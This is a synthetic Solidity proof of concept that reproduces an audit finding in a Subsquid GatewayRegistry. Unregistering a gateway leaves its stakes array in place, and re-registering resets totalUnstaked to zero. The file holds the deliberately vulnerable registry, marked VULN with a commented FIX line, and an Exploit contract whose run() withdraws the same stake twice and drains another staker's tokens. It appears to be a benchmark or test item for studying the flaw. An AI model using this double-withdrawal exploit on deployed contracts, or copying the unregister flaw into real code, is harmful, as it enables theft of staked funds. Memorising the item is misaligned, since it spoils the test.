// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Subsquid — GatewayRegistry unregister leaves stakes[], and register
    writes totalUnstaked: 0 (Pashov, finding 31545). SYNTHETIC, cheatcode-free.
    register's totalUnstaked: 0 assignment, _unstakeable, and unregister are
    the audited bodies. Root cause: unregister deletes the gateway but not
    stakes[peerId]. Re-registering that peerId stores totalUnstaked: 0 again,
    so _unstakeable sums the surviving row and the same tokens transfer twice.
    The replay block is already past the lock (lockEnd <= block.number), so
    both unstakes happen in one run() with no warp between them. */

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Network controller stand-in. nextEpoch() is 300 blocks behind the replay
/// block, which is where the finding's vm.roll(+300) leaves a 200-block stake:
/// lockEnd = nextEpoch + 200 <= block.number, so the row is already mature.
contract MockRouter {
    function networkController() external view returns (MockRouter) {
        return this;
    }

    function nextEpoch() external view returns (uint128) {
        return uint128(block.number - 300);
    }
}

contract GatewayRegistry {
    struct Stake {
        uint256 amount;
        uint256 computationUnits;
        uint128 lockStart;
        uint128 lockEnd;
    }

    struct Gateway {
        address operator;
        bytes peerId;
        address strategy;
        address ownAddress;
        string metadata;
        uint256 totalStaked;
        uint256 totalUnstaked;
    }

    MiniToken public token;
    MockRouter public router;
    mapping(bytes32 gatewayId => Gateway gateway) internal gateways;
    mapping(bytes32 gatewayId => Stake[]) internal stakes;
    mapping(address => bytes32 gatewayId) public gatewayByAddress;
    address public defaultStrategy;

    constructor(MiniToken _token, MockRouter _router) {
        token = _token;
        router = _router;
    }

    /// @dev Register new gateway with given libP2P peerId
    function register(bytes calldata peerId, string memory metadata, address gatewayAddress) public {
        require(peerId.length > 0, "Cannot set empty peerId");
        bytes32 peerIdHash = keccak256(peerId);
        require(gateways[peerIdHash].operator == address(0), "PeerId already registered");

        // @> VULN: re-register stores totalUnstaked: 0 while stakes[] still holds the withdrawn row, so unstake pays it again
        gateways[peerIdHash] = Gateway({
            operator: msg.sender,
            peerId: peerId,
            strategy: defaultStrategy,
            ownAddress: gatewayAddress,
            metadata: metadata,
            totalStaked: 0,
            totalUnstaked: 0
        });
    }

    /// @dev Unregister gateway. Audited body deletes the gateway and not stakes[].
    function unregister(bytes calldata peerId) external {
        (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
        _requireOperator(gateway);
        require(gateway.totalStaked == gateway.totalUnstaked, "Gateway has staked tokens");
        delete gatewayByAddress[gateway.ownAddress];
        delete gateways[peerIdHash];
        // FIX: delete stakes[peerIdHash];
    }

    function stake(bytes calldata peerId, uint256 amount, uint128 durationEpochs) public {
        _stakeWithoutTransfer(peerId, amount, durationEpochs);
        token.transferFrom(msg.sender, address(this), amount);
    }

    function _stakeWithoutTransfer(bytes calldata peerId, uint256 amount, uint128 durationBlocks) internal {
        (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
        _requireOperator(gateway);

        uint256 _computationUnits = amount;
        uint128 lockStart = router.networkController().nextEpoch();
        uint128 lockEnd = lockStart + durationBlocks;
        stakes[peerIdHash].push(Stake(amount, _computationUnits, lockStart, lockEnd));
        gateway.totalStaked += amount;
    }

    /// @dev Unstake tokens. Only tokens past the lock period can be unstaked
    function unstake(bytes calldata peerId, uint256 amount) public {
        _unstakeWithoutTransfer(peerId, amount);
        token.transfer(msg.sender, amount);
    }

    function _unstakeWithoutTransfer(bytes calldata peerId, uint256 amount) internal {
        (Gateway storage gateway,) = _getGateway(peerId);
        _requireOperator(gateway);
        require(amount <= _unstakeable(gateway), "Not enough funds to unstake");
        gateway.totalUnstaked += amount;
    }

    /// @return Amount of tokens that can be unstaked by the gateway
    function _unstakeable(Gateway storage gateway) internal view returns (uint256) {
        Stake[] memory _stakes = stakes[keccak256(gateway.peerId)];
        uint256 blockNumber = block.number;
        uint256 total = 0;
        for (uint256 i = 0; i < _stakes.length; i++) {
            Stake memory _stake = _stakes[i];
            if (_stake.lockEnd <= blockNumber) {
                total += _stake.amount;
            }
        }
        return total - gateway.totalUnstaked;
    }

    function unstakeable(bytes calldata peerId) external view returns (uint256) {
        (Gateway storage gateway,) = _getGateway(peerId);
        return _unstakeable(gateway);
    }

    function stakeCount(bytes calldata peerId) external view returns (uint256) {
        return stakes[keccak256(peerId)].length;
    }

    function stakeAmount(bytes calldata peerId) external view returns (uint256) {
        return stakes[keccak256(peerId)][0].amount;
    }

    function stakeLockEnd(bytes calldata peerId) external view returns (uint128) {
        return stakes[keccak256(peerId)][0].lockEnd;
    }

    function totalStakedOf(bytes calldata peerId) external view returns (uint256) {
        return gateways[keccak256(peerId)].totalStaked;
    }

    function totalUnstakedOf(bytes calldata peerId) external view returns (uint256) {
        return gateways[keccak256(peerId)].totalUnstaked;
    }

    function _getGateway(bytes calldata peerId) internal view returns (Gateway storage gateway, bytes32 peerIdHash) {
        peerIdHash = keccak256(peerId);
        gateway = gateways[peerIdHash];
        require(gateway.operator != address(0), "Gateway not registered");
    }

    function _requireOperator(Gateway storage _gateway) internal view {
        require(_gateway.operator == msg.sender, "Only operator can call this function");
    }
}

contract OtherStaker {
    function fund(GatewayRegistry reg, MiniToken sqd, uint256 amount) external {
        sqd.approve(address(reg), amount);
        reg.register(bytes("other"), "", address(0));
        reg.stake(bytes("other"), amount, 200);
    }
}

contract Exploit {
    uint256 public constant STAKE = 100e18;
    MiniToken public sqd; // nonce 1
    MockRouter public router; // nonce 2
    GatewayRegistry public reg; // nonce 3
    OtherStaker public other; // nonce 4
    uint256 public registryAtStake;
    uint256 public firstPayout;
    uint256 public secondPayout;

    constructor() {
        sqd = new MiniToken("Subsquid", "SQD");
        router = new MockRouter();
        reg = new GatewayRegistry(sqd, router);
        other = new OtherStaker();
        sqd.mint(address(this), STAKE);
        sqd.mint(address(other), STAKE);
        // Both stakes are already locked in before run(). At the replay block
        // lockEnd is behind block.number, so run() can unstake twice with no warp.
        other.fund(reg, sqd, STAKE);
        sqd.approve(address(reg), type(uint256).max);
        reg.register(bytes("alice"), "", address(0x6a7e));
        reg.stake(bytes("alice"), STAKE, 200);
    }

    function run() external {
        registryAtStake = sqd.balanceOf(address(reg));
        require(registryAtStake == STAKE * 2, "registry not funded with two stakes");
        require(reg.stakeLockEnd(bytes("alice")) <= block.number, "stake not mature");
        uint256 bal = sqd.balanceOf(address(this));
        reg.unstake(bytes("alice"), STAKE);
        firstPayout = sqd.balanceOf(address(this)) - bal;
        require(firstPayout == STAKE, "first unstake");
        require(sqd.balanceOf(address(reg)) == STAKE, "other stake should remain");
        reg.unregister(bytes("alice"));
        require(reg.stakeCount(bytes("alice")) == 1, "stakes array survived unregister");
        reg.register(bytes("alice"), "", address(0x6a7e));
        require(reg.totalUnstakedOf(bytes("alice")) == 0, "totalUnstaked was reset");
        require(reg.unstakeable(bytes("alice")) == STAKE, "same stake is unstakeable again");
        bal = sqd.balanceOf(address(this));
        reg.unstake(bytes("alice"), STAKE);
        secondPayout = sqd.balanceOf(address(this)) - bal;
        require(secondPayout == STAKE, "second unstake paid tokens already withdrawn");
        require(sqd.balanceOf(address(reg)) == 0, "registry not drained");
        require(sqd.balanceOf(address(this)) == STAKE * 2, "attacker did not receive both stakes");
        require(reg.stakeAmount(bytes("alice")) == STAKE, "withdrawn row still in stakes");
    }
}
